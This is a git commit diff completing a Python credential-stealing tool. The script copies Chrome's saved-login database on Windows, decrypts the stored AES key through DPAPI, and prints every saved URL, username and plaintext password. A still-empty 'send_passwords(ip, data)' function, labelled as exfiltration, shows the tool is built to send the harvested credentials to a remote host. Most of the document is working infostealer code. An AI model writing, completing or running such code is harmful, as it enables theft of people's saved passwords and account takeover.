58463fcdf893f9e80c3f26a863f91f4daeeac56e
Aleksa Zatezalo <zabumaphu@gmail.com>
2025-05-27 22:03:47 +0200

    Functionality complete for extraction

--- password.py
+++ password.py
@@ -9,7 +9,7 @@ import json
 import base64
 import sqlite3
 import win32crypt
-from Cryptodome.Cipher import AES
+from Crypto.Cipher import AES
 import shutil
 from datetime import timezone, datetime, timedelta
 import requests
@@ -35,7 +35,7 @@ def fetching_encryption_key():
         local_state_data = json.loads(local_state_data)
     
     # decoding the encryption key using base64
-    encryption_key = base64.base64(local_state_data["os_crypt"]["encrypted_key"])
+    encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
 
     # remove Windows Data Protection API (DPAPI) str
     encryption_key = encryption_key[5:]
@@ -68,7 +68,55 @@ def fetch_passwords():
     Fetches passwords from chrome.
     """
 
-    pass
+    key = fetching_encryption_key()
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                           "Google", "Chrome", "User Data", "default", "Login Data")
+    filename = "ChromePasswords.db"
+    shutil.copyfile(db_path, filename)
+    
+    # connecting to the database
+    db = sqlite3.connect(filename)
+    cursor = db.cursor()
+    
+    # 'logins' table has the data
+    cursor.execute(
+        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
+        "order by date_last_used")
+    
+    # iterate over all rows
+    for row in cursor.fetchall():
+        main_url = row[0]
+        login_page_url = row[1]
+        user_name = row[2]
+        decrypted_password = password_decryption(row[3], key)
+        date_of_creation = row[4]
+        last_usuage = row[5]
+        
+        if user_name or decrypted_password:
+            print(f"Main URL: {main_url}")
+            print(f"Login URL: {login_page_url}")
+            print(f"User name: {user_name}")
+            print(f"Decrypted Password: {decrypted_password}")
+        
+        else:
+            continue
+        
+        if date_of_creation != 86400000000 and date_of_creation:
+            print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}")
+        
+        if last_usuage != 86400000000 and last_usuage:
+            print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
+        print("=" * 100)
+    cursor.close()
+    db.close()
+    
+    try:
+        
+        # trying to remove the copied db file as 
+        # well from local computer
+        os.remove(filename)
+    except:
+        pass
 
 
 # Exfiltrate password functionality
@@ -80,7 +128,7 @@ def send_passwords(ip, data):
     pass
 
 def main():
-    pass
+    fetch_passwords()
 
 if __name__ == "__main__":
     main()
